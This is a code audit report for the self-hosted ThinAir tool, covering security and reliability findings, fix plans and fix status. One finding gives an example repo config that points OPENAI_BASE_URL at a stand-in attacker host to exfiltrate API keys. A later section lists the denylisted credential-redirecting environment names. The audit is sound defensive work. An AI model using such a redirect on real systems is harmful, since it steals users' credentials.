# ThinAir code audit, 2026-11

## Context
Deep audit of the repo at `feat/pr-editor-and-ui` (HEAD 5eb4a18). All seven onboarding-v2 phases are already
shipped (progress log), so nothing below is "planned later": every finding is in code that exists today.
The audit was read-only; fixes are tracked per finding below (a check mark and the commit that fixed it).

**Evidence gathered**
- `ruff check` + `ruff format --check`: clean. `pytest -m "not docker"`: all pass, **84% line coverage** (7494 stmts).
- `pip-audit` on the lockfile: no known vulnerabilities.
- `bandit`: only `/tmp` (`HOME=/tmp` inside sandboxes), `assert`, token-name "passwords": all false positives, already `noqa`'d.
- `pyright`: 117 errors, nearly all SQLModel/SQLAlchemy column-typing noise. **One real bug** (A8). `login.py:573` is a false positive (guarded by `hasattr`).
- **`shellcheck install.sh` was NOT run** (not installed; Docker daemon was down). Installer findings are from reading only.
- Three findings (A1, A2, A3) were reproduced with throwaway scripts; those reproductions become the regression tests.
- Not read line by line: `doctor.py`, `netinfo.py`, `notify.py`, `push.py`, `github_app.py`, `profiler/*`, most of the JS views. I traced every job-scoped route in `api/routes.py` for ownership; areas below marked solid are solid only to that depth.

**Solid (one line each)**: route ownership/visibility (every job-scoped route goes through `_job_and_repo`/`_visible_repo`, non-owners get 404);
`SandboxSpec` (named volumes only, data-volume ban); egress proxy parsing (`host_allowed`, CONNECT-only, no IP literals);
secret masking before line cut; one-time `state` consumption; Web Push endpoint allow-list; CSP + no markup-from-string sinks;
profiler search (97% covered).

## Summary
1. Health is good: strong isolation defaults, careful auth, high test discipline. Bugs cluster at **boundaries nobody exercised**: process restart, hostile output, concurrency.
2. **Top 5:** (A1) a repo's test output can OOM-kill the server; (A2) after a restart, interrupted jobs never send a final event so the browser reconnects forever; (A3) a pairing code can be redeemed twice; (A4) the default trusted-proxy range lets a client forge `X-Forwarded-For` when the port is published directly; (A5) a repo's `thinair.yaml env` reaches the agent container that holds the login and API keys.
3. Release pipeline publishes `latest`/`edge` without waiting for CI and installs unlocked dependencies (A6).
4. Coverage is lowest exactly where the risk is (`sandbox/manager.py` 28%, `egress.py` 54%, `cli_adapter.py` 43%): those are only exercised by Docker tests.
5. Code-health refactors are not worth doing now; none of the large modules is causing bugs.

## Findings table
| ID | Sev | Category | Status | Where | Problem | Effort |
|----|-----|----------|--------|-------|---------|--------|
| A1 ✅ 225b1f2 | High | Reliability/Security | CONFIRMED | `sandbox/manager.py:578-615` | `_stream_logs` buffers a line without limit: output with no `\n` grows memory and CPU quadratically | S |
| A2 ✅ cea2e7a | High | Correctness | CONFIRMED | `jobs/service.py:127-142` | Crash recovery writes the `interrupted` status but emits no final STATUS event; SSE ends without one | S |
| A3 ✅ de61106+test fix | Medium | Security | CONFIRMED (forced interleaving) | `pairing.py:107-123` | `redeem` is read-then-write: two simultaneous requests both get a token from one one-time code | S |
| A4 ✅ e44c8e3 | Medium | Security | PLAUSIBLE | `config.py:41`, `cli/main.py` `uvicorn_options` | Trusted proxies include all RFC1918 (the Docker bridge gateway), so a directly published port honours a forged `X-Forwarded-For` | M |
| A5 ✅ 8ad2d1c | Medium | Security | PLAUSIBLE | `agents/cli_adapter.py:221-222`, `project/detect.py:66` | Repo-controlled `thinair.yaml env` is placed in the agent container (next to the login volume and passthrough API keys) | M |
| A6 ✅ 8ad169e (partly) | Medium | Release | CONFIRMED | `release.yml`, `Dockerfile:18` | Images pushed with no CI gate; `pip install .` ignores `uv.lock`; no provenance/SBOM/signature | M |
| A7 ⏸ deferred | Medium | Upgrade path | PLAUSIBLE | `install.sh:26,469` | Compose file is fetched from `main` but the image is the latest release: version skew | M |
| A8 ✅ 61dc607 | Low | Correctness | CONFIRMED | `runner_client.py:178-184` | `except (RequestException, ValueError)` precedes `except RunnerSetupError` (a `ValueError`): the "runner disabled, stop" branch is dead | S |
| A9 ✅ 1fa2dfa | Low | Correctness | CONFIRMED (by reading) | `project/prepare.py:29,54` | `Foo/Bar`, `foo/bar`, `foo/bar.git` become three `Repo` rows; owner/name `..` passes the regex | S |
| A10 ⏸ skipped | Low | Correctness | PLAUSIBLE | `jobs/pr.py:437` | PR base = `parent.ref`; a tag/sha ref gives GitHub 422 *after* the branch was pushed | S |
| A11 ❌ withdrawn | Low | Postgres | PLAUSIBLE | `db/session.py:31` | Naive `timestamp` columns get aware datetimes; non-UTC server timezone shifts stored values | S |
| A12 ⏸ deferred | Low | Reliability | PLAUSIBLE | `jobs/service.py:362-368,436-447` | If the final DB write fails (disk full), the job stays RUNNING and its SSE hangs until restart | S |
| A13 ✅ 6ee3ac7 | Low | Performance | PLAUSIBLE | `jobs/events.py:41` | Log cap is 50,000 events x up to 8,192 chars (~400 MB/job) | S |
| A14 ✅ fix(setup) commit | Low | Security | CONFIRMED (by reading) | `api/setup_api.py:144-152` | Any member can start agent-image builds (heavy on 1 GB) | S |
| A15 ✅ b5761c3 | Low | Security | CONFIRMED (by reading) | `api/routes.py:425-446` | An open SSE stream keeps running after its token is revoked / user disabled | S |
| A16 ✅ 8ad169e (partly) | Low | CI | CONFIRMED | `ci.yml` | No shellcheck, pip-audit, ARM, concurrency; CI runs twice on PR branches; docker-only modules have no coverage signal | S |

## Finding details

### A1 High: unbounded line buffer (`_stream_logs`) ✅ fixed in 225b1f2
- **Problem.** `buf += chunk; *lines, buf = buf.split(b"\n")`. With no newline the whole stream stays in `buf`; the 5 MiB `max_output_bytes` is checked only in `emit`, i.e. after a line completes. `bytes +=` also copies every time (quadratic). A progress bar using only `\r`, or `yes | tr -d '\n'`, triggers it.
- **Evidence (throwaway script, 64 KiB chunks, no newline):** 8 MB: 0.3 s, peak 17 MB. 32 MB: 5.3 s, peak 67 MB. 64 MB: **21 s, peak 134 MB**, one line emitted (cap is 5 MiB). Time x4 per size x2. A container can emit GB/s; the server container is `mem_limit: 256m`, and the copying runs on a thread holding the GIL, stalling the event loop.
- **Failure scenario.** Profile or agent job on a repo whose test prints without newlines (hostile or just a buggy progress bar): the server is OOM-killed, every running job becomes `interrupted` (and see A2).
- **Fix.** In `_stream_logs` (`manager.py`): keep `buf` a `bytearray`; add `MAX_LINE_BYTES = 64 KiB`; after each chunk, while `len(buf) > MAX_LINE_BYTES` emit the first `MAX_LINE_BYTES` as one line (mark truncated) and drop the rest up to the next newline (`discarding` flag). Count `total` in raw bytes as they arrive, before splitting, so the global cap holds. Keep masking BEFORE the cut (existing gotcha): mask on the 64 KiB window plus a `max(len(secret))` carry-over so a secret across the cut is still masked. Keep draining the stream after the cap so the container never blocks on a full pipe.
- **Test.** `tests/test_sandbox_unit.py` (no Docker): fake container whose `logs()` yields 64 MiB of `b"A"*65536`; assert wall time < 2 s, `tracemalloc` peak < 8 MB, emitted lines <= cap/64 KiB + 1, truncated flag set. Second test: a secret straddling the 64 KiB cut is fully masked.

### A2 High: recovered jobs never emit a terminal STATUS event ✅ fixed in cea2e7a
- **Problem.** `_recover` (service.py:135) calls `_finish_row` directly. Every other path uses `_finish`, which emits the STATUS event first. The notes state the UI relies on that event (`views-jobs.js:285-306`: it closes the `EventSource` and loads the report/result only on a terminal status).
- **Evidence (throwaway script):** RUNNING job recovered at start -> `events: []`; `stream()` yields 0 frames and returns. `test_restart_recovery` only asserts the DB row.
- **Failure scenario.** Server restarts (A1's OOM, a deploy, a reboot) while a job runs. The phone opens that job: stream ends at once with no terminal event, the browser's `EventSource` auto-reconnects every ~3 s forever, "Reconnecting..." shows, and the partial result is never loaded.
- **Fix.** `_recover`: collect ids first (don't write inside the select session), then call `self._finish(j.id, FAILED, "interrupted", msg)` for RUNNING jobs. Defence in the UI (`views-jobs.js` error handler): if the stream closes and `current.job.finished` is true, `es.close()` and render once.
- **Test.** Extend `test_restart_recovery`: after start, `events.fetch(running.id)` ends with a STATUS event `failed`; and `[f async for f in events.stream(running.id)]` contains it.

### A3 Medium: pairing code redeemable twice ✅ fixed (Batch 2)
- **Problem.** `redeem` reads the row, checks `used_at is None`, then sets it. The route is a sync `def` (threadpool), so two requests interleave. `onetime.consume_state` already does this right (conditional UPDATE).
- **Evidence (throwaway script):** two threads forced between read and write: **2 tokens from one code**. Natural window is microseconds, so PLAUSIBLE in the wild, but the "works once" promise in SECURITY.md is only true by luck.
- **Scenario.** Someone who photographed the QR races the owner within the 10-minute window; both signed in, neither knows.
- **Fix.** `pairing.redeem`: `UPDATE pairingcode SET used_at=:now WHERE code_hash=:h AND used_at IS NULL AND expires_at > :now` and require `rowcount == 1`, then create the token (copy the pattern in `onetime.py`). Same for the short-code path (use `row.code_hash`).
- **Test.** Turn the reproduction into `tests/test_pairing.py` (barrier-patched `_find`); assert exactly one token.

### A4 Medium: `X-Forwarded-For` trusted from the whole Docker bridge ✅ fixed (Batch 3)
- **Problem.** `trusted_proxies` defaults to `10/8, 172.16/12, 192.168/16, fc00::/7, loopback`. If the thinair port is published directly (`THINAIR_BIND=0.0.0.0`, the no-Caddy path), Docker's userland proxy, IPv6 publishing and rootless Docker show the peer as the bridge gateway (172.x): trusted. A client's `X-Forwarded-For` then becomes its throttle key. SECURITY.md line 95 states this as safe only "where Caddy sits".
- **Scenario.** Attacker sends a fresh `X-Forwarded-For` per request: the 10-failures/min throttle never fires. Against 20-31 character hand-picked `THINAIR_ADMIN_TOKEN`s, and the 8-character pairing code, that removes the online-guessing brake (the 20-failure burn of short codes remains).
- **Fix.** Default `trusted_proxies` to loopback only; have the installer's domain mode and the `https` compose profile set `THINAIR_TRUSTED_PROXIES=172.16.0.0/12` (the compose network) in `.env`. Add a global backstop in `api/auth.py`: more than 200 failures/min across all keys -> only strong tokens are checked (same rule as today's throttled state). Doctor: warn when `THINAIR_BIND` is not loopback and no domain is set.
- **Test.** Live-server test (the existing one that caught the IPv4 crash): request from 127.0.0.1 with a forged header under default settings must not change the key; with trusted set, it must. Unit test for the global backstop.

### A5 Medium: repo `thinair.yaml env` reaches the agent container ✅ fixed (Batch 3, with a denylist)
- **Problem.** `CLIAdapter._env` = `{**resolved.env, **cfg.env, **passthrough}`; `resolved.env` includes the repo's `config.env` (detect.py:66). The agent container mounts the login volume and receives passthrough API keys. SECURITY.md documents that an agent *can be tricked* into leaking logins; this is deterministic: no agent cooperation is needed.
- **Scenario (PLAUSIBLE; depends on each CLI honouring the variable).** Repo ships `env: {OPENAI_BASE_URL: https://evil.example}` (or a `*_BASE_URL`, `NODE_OPTIONS`, `SSL_CERT_FILE`, `NODE_EXTRA_CA_CERTS`). Codex/Gemini runs have open egress, so the key or login token goes to the attacker. The built-in Anthropic agent is protected by its allowlist today, but only while `THINAIR_AGENT_EGRESS=allowlist`.
- **Fix.** In `CLIAdapter._env` drop repo env entirely for agent runs except keys the agent config lists (`AgentConfig.env_from_repo: [...]`, default empty). The repo env still applies to install/test steps. Keep PATH/VIRTUAL_ENV (they come from `_PY_ENV`, not the repo). Document in docs/agents.md and the `thinair.yaml` reference.
- **Test.** `test_agents_unit.py`: a `ResolvedProject` with `env={"OPENAI_BASE_URL": "x"}` produces an agent env without it; PATH is kept.

### A6 Medium: release pipeline ✅ partly fixed (Batch 4)
- **Problem.** `release.yml` runs on every push to `main` and every tag independently of `ci.yml`: a red commit still publishes `edge`, a red tag publishes `latest`. `Dockerfile` runs `pip install .` so dependency versions are whatever is newest at build time (the committed `uv.lock` is not used). Base images are tags, not digests. No SBOM/provenance attestation or signature, so users can't verify what `install.sh` pulls.
- **Fix.** (1) Add a `test` job (ruff + `pytest -m "not docker"`) and `needs: test` to the image job (or `workflow_call` CI). (2) Export constraints in the build: `uv export --no-hashes --no-dev > constraints.txt` committed/generated in the workflow; Dockerfile `pip install -c constraints.txt ".${EXTRAS...}"`. (3) `provenance: mode=max`, `sbom: true` on build-push; keyless `cosign sign` of the digest (needs `id-token: write`). (4) Pin base image digests via Dependabot/Renovate.
- **Test.** Workflow-level: a deliberately failing test on a throwaway branch must block the image job; `docker buildx imagetools inspect` shows attestations.

### A7 Medium: installer fetches compose from `main` ⏸ deferred
- **Problem.** `RAW_URL=.../main` and `fetch $RAW_URL/docker-compose.yml`, while the image tag defaults to `latest` (last release). A commit on main that changes compose (e.g. the `NETWORKS: 1` the egress allowlist needs) reaches installs before an image that supports it exists.
- **Fix.** Publish `docker-compose.yml` and `install.sh` as release assets (in `release.yml`), and have the installer fetch the compose file for the resolved version (`.../releases/download/vX.Y.Z/docker-compose.yml`; for `latest`, `.../releases/latest/download/...`; `edge` and `local` keep using main). `THINAIR_RAW_URL` stays for offline tests.
- **Test.** The existing `docker:cli` installer test with a fake release layout; assert the fetched compose matches the tag.

### A8 Low: disabled runner never stops ✅ fixed (Batch 2)
- **Problem.** `RunnerSetupError(ValueError)` (runner_client.py:37) is swallowed by the earlier `except (requests.RequestException, ValueError)`; pyright flags it as unreachable. Comment says "disabled while working: stop".
- **Scenario.** Admin disables a runner mid-job: it keeps profiling to the end, posting 401s every tick (each counts toward the failed-token throttle for that address).
- **Fix.** Put `except RunnerSetupError` first (re-raise path), then the generic one. **Test.** Extend the live-uvicorn runner test: disable the runner while the fake profiler sleeps; assert the client exits and the work task is cancelled.

### A9 Low: repo identity ✅ fixed (Batch 2)
- GitHub names are case-insensitive and `.git` is optional, but `GitSource.url` is only stripped of `/`. `https://github.com/Foo/Bar`, `.../foo/bar`, `.../foo/bar.git` become separate `Repo` rows (split history, defaults, member visibility). The regex also accepts `..` as owner/name.
- **Fix.** Canonicalise in `GitSource` (strip `.git`, lowercase owner and name; reject `.`/`..`), look up existing rows with `func.lower(Repo.url)` so old rows still match (no data migration). **Test.** `test_api.py`: three spellings -> one repo id.

### A10 Low: PR base can be a tag or sha ⏸ skipped: the planned fix is wrong
`base = parent.ref or default_branch` (pr.py:437), and `GIT_REF` allows tags. GitHub returns 422 after the branch is already pushed (stray `thinair/<id>` branch, generic error). **Fix:** `GitHubClient.is_branch(owner, name, ref)` (`GET /branches/{ref}`), else fall back to the default branch and log it. **Test:** `test_pr.py` with the fake HTTP layer.

### A11 Low: Postgres timezone ❌ withdrawn: false positive
Columns are naive `timestamp`; code writes aware UTC datetimes. psycopg converts aware values using the session `TimeZone`, so on a non-UTC server `finished_at`, token `last_used_at` and pairing `expires_at` shift (retention cutoff, expiry checks). **Fix:** `make_engine` for Postgres: `connect_args={"options": "-c timezone=UTC"}`. **Test:** `test_postgres_docker.py`: `SHOW timezone` is `UTC`; round-trip an aware datetime on a server started with `TZ=Asia/Kathmandu`.

### A12 Low: failed final write leaves a job RUNNING ⏸ deferred: needs a larger change
`_execute`'s `finally` and `_finish` do DB writes with no fallback; a full disk or locked DB raises inside the worker, the row stays RUNNING, the SSE never ends. **Fix:** wrap `_finish` in a retry (3 tries, 1 s) and, on final failure, log loudly and keep the job id in `self._unsettled`, retried at the next `start()` (already handled by `_recover`). **Test:** executor that returns after monkeypatching `session_scope` to raise once.

### A13 Low: event cap by count ✅ fixed (Batch 4)
Cap per job is 50,000 events; each line may be 8,192 chars (about 400 MB in SQLite/PG in the worst case, and a profile job runs up to 40 sandboxes). **Fix:** also count bytes in `EventStore.emit` (default 20 MB per job, `THINAIR_MAX_LOG_BYTES`). **Test:** `test_events.py`.

### A14 Low: members can start image builds ✅ fixed (Batch 4)
`POST /api/setup` with `preferred_agent` calls `_start_prebuild` for any caller; on a 1 GB VM a build is heavy. **Fix:** only start the prebuild for admins (members' choice is still saved; their first job builds it, under the job limit). **Test:** `test_setup_api.py`.

### A15 Low: SSE outlives revocation ✅ fixed (Batch 4)
Auth is checked at connect only. **Fix:** in `EventStore.stream` callers, re-verify the token on each keep-alive (every 15 s: one indexed lookup); end the stream if revoked. **Test:** revoke during an open stream; stream ends within one heartbeat (use a short heartbeat).

### A16 Low: CI gaps ✅ partly fixed (Batch 4)
`ci.yml` runs on `push` and `pull_request` (double runs), has no shellcheck (the project conventions require install.sh to stay shellcheck-clean), no `pip-audit`, no ARM job (the product targets ARM VMs; release builds arm64 only under QEMU and never tests it), and no coverage signal for modules only the Docker job touches. **Fix:** `concurrency` group; `shellcheck install.sh` step; `uvx pip-audit`; a `ubuntu-24.04-arm` docker-tests job; `--cov` in the docker job with a floor on `sandbox/` and `agents/cli_adapter.py`. Align `checkout`/`setup-uv` versions with release.yml.

## Proposals (not for now)
- **P1: a filtering Docker proxy.** docker-socket-proxy filters by endpoint, not by body: with `CONTAINERS=1` + `POST=1`, a compromised Thinair process can create a privileged container with a host bind mount (SECURITY.md already says so in one line). A small Thinair-specific proxy (or a regex-allowlist socket proxy) that rejects `Privileged`, `Binds`, `HostConfig.NetworkMode=host`, added caps and non-`thinair.` labels would close it. Trade-off: one more component on a 100 MB idle budget; new code on the most security-critical path; wording in SECURITY.md should be sharpened either way.
- **P2: stop trusting forwarded headers by network range.** Have Caddy reach Thinair over a unix socket or a fixed address and trust only that. Removes A4's class. Trade-off: compose and installer rework.
- **P3: logs outside the database.** Append-only rotated files per job, DB keeps only status events. Cuts DB growth (A13) and the sync-commit-in-the-loop cost. Trade-off: SSE replay and retention rewritten; Postgres-without-a-volume deployments need a volume.
- **Not proposing:** splitting `routes.py`/`views-*.js`; they are large but not where bugs came from.

## Fix batches
Order = severity x 1/effort.

**Batch 1: `fix/audit-batch-1` (A1, A2 [+ A3 and A8 if you say yes, see Questions])**
Files: `sandbox/manager.py`, `jobs/service.py`, `web/static/views-jobs.js`, `tests/test_sandbox_unit.py` (new), `tests/test_jobs.py`, `docs/audits/2026-11-code-audit.md`.
1. Create the branch from `main`. Commit 1: the audit doc (`docs: code audit 2026-11`).
2. A1: write the two failing tests; run and watch them fail; implement the bounded `bytearray` buffer; green; `ruff`.
3. A2: extend `test_restart_recovery` (fails: no final STATUS); change `_recover` to `_finish`; add the UI guard; green.
4. Run `uv run ruff check . && uv run ruff format --check . && uv run pytest -m "not docker"` and `uv run pytest -m docker` (Docker Desktop was not running in this session: I'll start it or report Docker tests as not run).
5. One conventional commit per finding (`fix(sandbox): ...`, `fix(jobs): ...`), then update the audit doc with a checkmark and the commit hash (separate `docs:` commit), add the "Verify manually" list, push, open the PR with the full `gh` path.
Verify manually: restart the server mid-job and open the job on a phone (no reconnect loop); run a repo whose test prints 100 MB without newlines and watch server memory with `docker stats`.

**Batch 2: `fix/audit-batch-2` (A3, A8, A9, A10, A11, A12)** all S; the tests are listed in each finding.
**Batch 3: `fix/audit-batch-3` (A4, A5)** security hardening, M. A4 changes defaults: needs a CHANGELOG note and a doctor check.
**Batch 4: `fix/audit-batch-4` (A6, A7, A16, A13, A14, A15)** pipeline and installer; A6/A7 can't be fully tested without a real release tag, so they need a dry-run on a fork.

## Status of fixes (Batch 1, branch `fix/audit-batch-1`)
- ✅ A1 (225b1f2): `_stream_logs` keeps at most 64 KiB of an unfinished line (`MAX_LINE_BYTES`), shows its start masked as before and drops the rest up to the next newline. Tests: `test_output_without_newlines_uses_bounded_memory` (failed before: 67 MB peak; now < 8 MB), masking inside an overlong line, and unchanged behaviour for normal/CRLF/split lines.
- ✅ A2 (cea2e7a): `_recover` uses `_finish` (event first, then the row); `follow()` in `views-jobs.js` stops reconnecting when the job is already finished (covers jobs interrupted before the fix, which have no final event stored; their partial result is still not auto-loaded). Test: `test_restart_recovery` now asserts the stored final STATUS event and that the stream delivers it (failed before with an empty event list).
- Not in Batch 1: A3 to A16 (Batches 2 to 4 above).

### Verify manually (tests can't cover these)
1. Restart the server while a job is running, then open that job on a phone: it must show *failed (interrupted)* and no "Reconnecting..." that never goes away. Open a job that was interrupted *before* this fix: the page must stop reconnecting.
2. Profile a repo whose test prints 100 MB without a newline (for example `python -c "import sys; sys.stdout.write('A'*10**8)"`) and watch `docker stats`: the server container must stay far below its 256 MiB limit, and the log must show the start of the line followed by later output.
3. Real-device check of the job page is unchanged otherwise (only an extra early return in the stream's error handler).

## Status of fixes (Batch 2, branch `fix/audit-batch-2`, stacked on batch 1)
- ✅ A3: `redeem` marks the code used with a conditional UPDATE and only the request that changed the row signs in. The race test (two threads held between read and write) failed on the old code with `2 == 1`. (The first version of the test forgot to create the tables, so it failed for the wrong reason; corrected in a follow-up commit and re-proved against the old code.)
- ✅ A8: the `RunnerSetupError` clause now comes before the generic `ValueError` clause. Live-server test: a runner disabled mid-job stops and cancels its work (failed before: the worker kept running).
- ✅ A9: `GitSource` normalises the URL (no trailing slash or `.git`), `find_repo` matches without regard to case and still finds rows saved with `.git` or capitals, `.` and `..` as owner or name are refused, the dependency-cache volume name ignores case, and the repository picker's "added" flag ignores case. No data migration; existing duplicate rows (if any) stay separate until merged by hand.
- ⏸ A10 skipped: the planned fix (`GET /branches/{ref}`) needs the Contents permission, which the pull-request key deliberately lacks, so every PR with a non-default base would silently target the default branch. A safe alternative (retry with the default branch on GitHub's 422) cannot be verified without a real GitHub account. Revisit with one.
- ❌ A11 withdrawn: a real PostgreSQL 17 container with the database's time zone set to Asia/Kathmandu stored and returned the same UTC time on the unmodified code. SQLAlchemy's psycopg driver casts the parameter to `timestamp`, and PostgreSQL ignores the offset in that cast. The finding was reasoning without a reproduction; it should not have been listed as plausible.
- ⏸ A12 deferred: the planned retry cannot help a full disk (the database is the thing failing), a sleeping retry would block the event loop from sync code, and the "unsettled" list duplicates what restart recovery (`_recover`, now emitting its final event) already does. A proper fix means making `_finish` async with a bounded retry; do it only if a real stuck job is ever seen.

### Verify manually (Batch 2)
1. Pair two browsers with one QR code at the same moment (or script two `POST /api/pair` calls): exactly one signs in.
2. Disable a runner from the People/CLI screen while it runs a real profile job: the runner process exits with the "server refused the runner secret" message.
3. Add `https://github.com/<you>/<repo>`, then the same repository with different capitals and with `.git`: one project.

## Status of fixes (Batch 3, branch `fix/audit-batch-3`, stacked on batch 2)
- ✅ A4 (e44c8e3): `Settings.effective_trusted_proxies`: an explicit `THINAIR_TRUSTED_PROXIES` wins; otherwise loopback only, plus the private ranges once `THINAIR_DOMAIN` is set (Caddy, whose app port is loopback-only by default). `install.sh` needed no change because it already sets `THINAIR_DOMAIN` in every Caddy path. Backstop in `api/auth.py`: 200 failures a minute across all addresses make short tokens 429 (long generated tokens still pass), kept under a reserved key in `_failures` so every existing test fixture that clears it clears both. New doctor check "Proxy trust" warns when Caddy is on but `THINAIR_BIND` publishes the app port publicly. README, SECURITY.md and `.env.example` updated. **Behaviour change:** anyone running their own reverse proxy on a private address without `THINAIR_DOMAIN` must now set `THINAIR_TRUSTED_PROXIES` to see real client addresses in the throttle (without it all clients share one address; long tokens still work while throttled).
- ✅ A5 (8ad2d1c): **deviation from the plan.** The plan said repo env should never reach agents unless the agent config lists it (allowlist). That would stop agents from running tests that need ordinary settings (`PYTHONPATH`, `DATABASE_URL`). Instead names that redirect or carry credentials are dropped for agent runs: `*_BASE_URL`, `*_API_BASE`, `*_API_URL`, `*_ENDPOINT`, anything containing `PROXY`, `NODE_OPTIONS`, CA-bundle and `SSL_CERT_*` settings, `LD_*`, and the prefixes `ANTHROPIC_ OPENAI_ GEMINI_ GOOGLE_ CODEX_ CLAUDE_ COPILOT_ GH_ GITHUB_`. The job log lists the dropped names (never values). A denylist is incomplete by nature (for example an agent that reads a differently named endpoint variable); it closes the realistic zero-interaction route, it does not make a malicious repository safe. Flip to an allowlist (`env_from_repo` on the agent config) if you prefer that trade-off.

### Verify manually (Batch 3)
1. With the installer's default Caddy setup, run `thinair doctor`: "Proxy trust: ok". Set `THINAIR_BIND=0.0.0.0` in `.env`, restart: the check warns.
2. Behind Caddy, send wrong tokens from two phones: each is throttled separately (real addresses still counted).
3. Put `env: {OPENAI_BASE_URL: https://example.invalid}` in a test repo's `thinair.yaml`, run an agent job: the log shows the "not passing these thinair.yaml settings" line, and the agent's environment lacks it.

## Status of fixes (Batch 4, branch `fix/audit-batch-4`, stacked on batch 3)
- ✅ A13 (6ee3ac7): `EventStore` also caps stored log text per job in bytes (`THINAIR_MAX_LOG_BYTES`, default 20 MiB), with the same one-time notice; status and results are never dropped. The notice is now written exactly once per job (a `_capped` set replaces the old `seq == max + 1` test, which could miss it when a status event had taken that sequence number).
- ✅ A14: only admins start an agent-image build from the setup screen; a member's choice is still saved and their first job builds the image.
- ✅ A15 (b5761c3): an open job stream re-checks its token every 15 s (`STREAM_RECHECK_S`) and ends when it is revoked or the user disabled. The test failed before the change (stream still open after revocation).
- ✅ A6, partly (8ad169e): the release workflow now runs lint and the fast tests first (`needs: test`), builds against `uv export` constraints of `uv.lock` (the Dockerfile uses `constraints.txt` only when present, so local `--build` is unchanged), and attaches provenance (`mode=max`) and an SBOM. **Verified here:** the export command, and real Docker builds both without and with `constraints.txt` (the release-style image contains exactly the pinned versions). **Not done:** keyless cosign signing (needs an action version I could not verify) and base-image digest pinning (needs real digests and a bot to keep them fresh). **Not verified:** the workflows themselves have never run (they are syntax-checked as YAML only); the first push to `main` after merging is the real test.
- ✅ A16, partly (8ad169e): CI no longer runs twice on PR branches (push is limited to `main`), runs `shellcheck install.sh` (checked here with the official image: clean), has an informational `pip-audit` job, and an informational ARM leg for the Docker tests (it has never run on ARM; expect to fix things). **Not done:** a coverage floor for the Docker-only modules (there is no measured baseline to set it against) and aligning `checkout` and `setup-uv` versions between the two workflows (not verified as safe).
- ⏸ A7 deferred: the installer fetching a release-matched compose file is a change to the script users pipe into `sh`, and it can't be tested here beyond shellcheck (no release tag, no clean VM). Do it together with the first real release, with the installer's `docker:cli` test run against a fork's release assets.

### Verify manually (Batch 4)
1. Merge, then watch the first `main` run: `test` must gate `image`, and `docker buildx imagetools inspect ghcr.io/<owner>/thinair:edge` should show provenance and SBOM attestations.
2. Open a PR from a branch: CI runs once, not twice. Check the ARM leg's first result; fix or keep it informational.
3. Sign a phone out (Devices) while it watches a running job: its stream ends within about 15 seconds.
4. Run a job that prints more than 20 MiB: the log ends with the "log limit reached" notice and the job still finishes with its result.
